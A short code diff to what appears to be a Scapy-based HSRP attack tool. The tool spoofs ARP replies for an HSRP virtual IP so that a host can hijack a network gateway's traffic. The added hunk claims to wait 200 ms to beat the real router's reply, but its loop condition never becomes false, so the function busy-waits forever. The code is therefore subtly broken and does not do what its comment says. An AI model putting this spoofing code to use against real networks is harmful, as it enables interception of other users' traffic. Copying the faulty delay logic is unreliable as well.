@@ -269,6 +269,7 @@ def send_initial_arp(type, pause=True):
 
 def start_arp_responder(packet):
     '''sniff and respond to arp request for HSRP virtual ip address from network'''
+    start = time.time() * 1000
     if version == 1:
         virtualIP = packet[HSRP].virtualIP
     elif version == 2:
@@ -277,6 +278,9 @@ def start_arp_responder(packet):
     if debug:
         print(f"[DEBUG] Responding to ARP requests for {virtualIP}")
     filterstring = f"arp and (arp[6:2] = 1) and dst host {virtualIP} and src host not {virtualIP} and ether src host not {mymac}"
+    # delay 200ms to beat ARP response from HSRP router when HSRP attack fails but arp not blocked
+    while start - time.time() * 1000 < 200:
+        pass
     sniff(prn=arp_respond, filter=filterstring)
 
 def arp_respond(packet):
